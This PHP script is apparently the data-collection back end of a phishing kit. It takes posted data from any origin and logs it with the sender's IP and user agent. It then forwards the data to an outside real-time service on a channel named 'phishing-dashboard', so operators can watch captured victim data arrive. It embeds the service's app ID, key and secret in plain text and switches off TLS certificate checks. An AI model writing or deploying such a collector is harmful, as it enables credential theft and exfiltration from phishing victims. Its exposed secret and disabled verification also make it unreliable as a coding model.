<?php
// Set headers
header('Content-Type: application/json');
header('Access-Control-Allow-Origin: *');
header('Access-Control-Allow-Methods: POST, GET, OPTIONS');
header('Access-Control-Allow-Headers: Content-Type');

// Handle preflight OPTIONS request
if ($_SERVER['REQUEST_METHOD'] === 'OPTIONS') {
    http_response_code(200);
    exit();
}

// Only allow POST requests
if ($_SERVER['REQUEST_METHOD'] !== 'POST') {
    http_response_code(405);
    echo json_encode(['error' => 'Method not allowed']);
    exit();
}

// Get JSON input
$input = json_decode(file_get_contents('php://input'), true);

if (!$input) {
    http_response_code(400);
    echo json_encode(['error' => 'Invalid JSON input']);
    exit();
}

// Pusher configuration - Updated with new credentials
$app_id = '2056311';
$key = '049ee983c4ec4cecf834';
$secret = '6ee5cb53d3b09e78a6a1';
$cluster = 'ap1';

// Function to send data to Pusher
function sendToPusher($app_id, $key, $secret, $cluster, $channel, $event, $data) {
    $url = "https://api.pusherapp.com/apps/{$app_id}/events";
    
    $postData = [
        'name' => $event,
        'channel' => $channel,
        'data' => json_encode($data)
    ];
    
    // Create signature
    $stringToSign = "POST\n/apps/{$app_id}/events\n" . http_build_query($postData);
    $signature = hash_hmac('sha256', $stringToSign, $secret);
    
    $postData['auth_key'] = $key;
    $postData['auth_timestamp'] = time();
    $postData['auth_version'] = '1.0';
    $postData['auth_signature'] = $signature;
    
    // Send to Pusher using cURL
    $ch = curl_init();
    curl_setopt($ch, CURLOPT_URL, $url);
    curl_setopt($ch, CURLOPT_POST, true);
    curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query($postData));
    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
    curl_setopt($ch, CURLOPT_HTTPHEADER, [
        'Content-Type: application/x-www-form-urlencoded'
    ]);
    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
    curl_setopt($ch, CURLOPT_TIMEOUT, 10);
    curl_setopt($ch, CURLOPT_USERAGENT, 'PHP-Pusher-Client/1.0');
    
    $response = curl_exec($ch);
    $httpCode = curl_getinfo($ch, CURLINFO_HTTP_CODE);
    $error = curl_error($ch);
    curl_close($ch);
    
    return [
        'success' => $httpCode === 200,
        'response' => $response,
        'http_code' => $httpCode,
        'error' => $error
    ];
}

// Function to log data
function logData($data) {
    $logFile = 'pusher_logs.txt';
    $timestamp = date('Y-m-d H:i:s');
    $logEntry = "[$timestamp] " . json_encode($data) . "\n";
    file_put_contents($logFile, $logEntry, FILE_APPEND | LOCK_EX);
}

try {
    // Validate required fields
    if (!isset($input['type']) || !isset($input['data'])) {
        throw new Exception('Missing required fields: type and data');
    }
    
    $type = $input['type'];
    $data = $input['data'];
    
    // Log the received data
    logData([
        'type' => $type,
        'data' => $data,
        'ip' => $_SERVER['REMOTE_ADDR'] ?? 'unknown',
        'user_agent' => $_SERVER['HTTP_USER_AGENT'] ?? 'unknown'
    ]);
    
    // Send to Pusher
    $result = sendToPusher($app_id, $key, $secret, $cluster, 'phishing-dashboard', $type, $data);
    
    if ($result['success']) {
        echo json_encode([
            'success' => true,
            'message' => 'Data sent to dashboard successfully',
            'pusher_response' => $result['response']
        ]);
    } else {
        // Log the error
        logData([
            'error' => 'Pusher send failed',
            'http_code' => $result['http_code'],
            'response' => $result['response'],
            'curl_error' => $result['error']
        ]);
        
        // Return success to frontend but log the Pusher error
        echo json_encode([
            'success' => true,
            'message' => 'Data logged successfully (Pusher may be offline)',
            'pusher_error' => $result['response'],
            'debug' => [
                'http_code' => $result['http_code'],
                'curl_error' => $result['error']
            ]
        ]);
    }
    
} catch (Exception $e) {
    // Log the error
    logData([
        'error' => $e->getMessage(),
        'trace' => $e->getTraceAsString()
    ]);
    
    http_response_code(500);
    echo json_encode([
        'success' => false,
        'error' => $e->getMessage()
    ]);
}
?>
